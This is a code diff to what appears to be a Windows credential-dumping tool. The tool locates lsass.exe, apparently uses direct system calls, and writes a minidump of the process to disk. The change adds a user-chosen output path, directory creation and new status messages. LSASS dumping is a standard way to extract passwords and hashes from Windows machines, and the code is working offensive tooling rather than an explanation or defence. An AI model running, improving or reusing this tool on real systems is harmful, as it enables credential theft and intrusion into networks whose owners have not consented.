@@ -71,9 +71,31 @@ DWORD GetLsassPID() {
 }
 
 bool CreateMiniDump(HANDLE processHandle, DWORD processId) {
-    HANDLE hFile = CreateFile(_T("c:\\temp\\lsass.dmp"), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    TCHAR defaultDir[] = _T("C:\\temp");
+    TCHAR filePath[MAX_PATH] = _T("");
+
+    if (GetFileAttributes(defaultDir) == INVALID_FILE_ATTRIBUTES) {
+        if (!CreateDirectory(defaultDir, NULL)) {
+            _tprintf(_T("Failed to create directory: %s\n"), defaultDir);
+            return false;
+        }
+    }
+
+    _tprintf(_T("Enter the path to save the dump file default: C:\\temp\\lsass.dmp: "));
+    _fgetts(filePath, MAX_PATH, stdin);
+
+    size_t len = _tcslen(filePath);
+    if (len > 0 && filePath[len - 1] == _T('\n')) {
+        filePath[len - 1] = _T('\0');
+    }
+
+    if (_tcslen(filePath) == 0) {
+        _stprintf_s(filePath, _T("%s\\lsass.dmp"), defaultDir);
+    }
+
+    HANDLE hFile = CreateFile(filePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
-        cout << "Failed to create dump file.\n";
+        _tprintf(_T("Failed to create dump file at: %s\n"), filePath);
         return false;
     }
 
@@ -81,12 +103,14 @@ bool CreateMiniDump(HANDLE processHandle, DWORD processId) {
     CloseHandle(hFile);
 
     if (!success) {
-        cout << "Failed to dump lsass.exe.\n";
+        _tprintf(_T("Failed to dump lsass.exe to: %s\n"), filePath);
         return false;
     }
-    cout << "Dump created successfully.\n";
+
+    _tprintf(_T("Dump created successfully at: %s\n"), filePath);
     return true;
 }
+
 
 int main() {
     InitializeSystemCalls();
@@ -116,7 +140,7 @@ int main() {
         return 1;
     }
 
-    // Create a minidump of the lsass.exe process
+ 
     if (!CreateMiniDump(hLsass, lsassPID)) {
         g_ZwClose(hLsass);
         return 1;
